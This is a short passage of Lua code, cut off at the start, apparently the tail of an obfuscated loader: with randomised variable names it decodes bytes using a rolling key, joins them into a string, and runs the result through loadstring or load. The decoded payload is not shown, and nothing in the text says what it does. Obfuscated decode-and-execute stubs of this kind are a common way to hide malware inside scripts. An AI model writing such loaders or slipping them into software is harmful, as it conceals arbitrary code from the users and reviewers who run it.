    local k = (_K + (F_qqeVJ - 1)) % 256
    table.insert(zDgamPB, string.char(SwICnKo(b, k)))
    F_qqeVJ = F_qqeVJ + 1
end

local JHufUne = table.concat(zDgamPB, "")
local CCRnUCm = loadstring or load
if CCRnUCm then
    local fn = CCRnUCm(JHufUne)
    if fn then fn() end
  end
